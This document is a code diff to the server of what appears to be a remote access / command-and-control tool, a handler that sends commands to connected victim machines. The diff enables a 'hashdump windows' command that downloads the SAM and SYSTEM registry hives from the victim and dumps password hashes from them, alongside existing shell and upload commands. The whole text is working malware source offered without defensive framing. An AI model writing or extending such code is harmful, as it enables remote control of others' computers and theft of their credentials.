@@ -50,7 +50,7 @@ def handle_client(conn, addr, command_queue):
                 command = client.command_controller(command.lower())
 
                 # Send the command to the client
-                if command != "shell":
+                if command != "shell" and command != "hashdump windows":
                     if command != "help" and \
                             command != "unknown" and \
                             command != "error":
@@ -66,14 +66,23 @@ def handle_client(conn, addr, command_queue):
                                 continue
                             else:
                                 sam_path = lib.download_file("sam", conn)
+                                download_status = conn.recv(1024).decode('utf-8')
+                                if download_status == "NOK":
+                                    print("[-] Error while downloading the file.")
+                                    lib.print_mko_client(current_thread.ident)
+
                                 # sleep to avoid conflict
                                 time.sleep(1)
-                                #sys_path = lib.download_file("system", conn)
+                                sys_path = lib.download_file("system", conn)
+                                download_status = conn.recv(1024).decode('utf-8')
+                                if download_status == "NOK":
+                                    print("[-] Error while downloading the file.")
+                                    lib.print_mko_client(current_thread.ident)
 
                                 print("sam_path: ", sam_path)
-                               # print("sys_path: ", sys_path)
+                                print("sys_path: ", sys_path)
 
-                                #lib.secret_dump_from_files(sam_path, sys_path)
+                                lib.secret_dump_from_file(sam_path, sys_path)
 
                         if command.startswith("upload"):
                             file_path = command.split(" ")[1]
@@ -98,11 +107,13 @@ def handle_client(conn, addr, command_queue):
                         if command == "close":
                             break
 
-                        # Receive the output of the command
-                        message = conn.recv(1024).decode('utf-8')
-                        if not message:
-                            break
-                        print(f"{message}\n")
+                        # Receive the output of the command if it's not
+                        # hashdump windows command
+                        if command != "hashdump windows":
+                            message = conn.recv(4096).decode('utf-8')
+                            if not message:
+                                break
+                            print(f"{message}\n")
 
                     lib.print_mko_client(current_thread.ident)
 
@@ -119,13 +130,18 @@ def handle_client(conn, addr, command_queue):
             context_manager = None
             # remove current client from the list
 
-            #print all threads
-            print("ID   TID   \n--   ---  ")
-            for thread_id in threads:
-                print(f"{thread_id}   {threads[thread_id]}")
-            print("\n")
+            #get the key of current_thread.ident in threads
+            key = None
+            for k, v in threads.items():
+                if v == current_thread.ident:
+                    key = k
+                    break
+
+            threads.pop(key)
 
             lib.print_mko_prefix()
+
+
         else:
             lib.print_mko_client(context_manager)
 
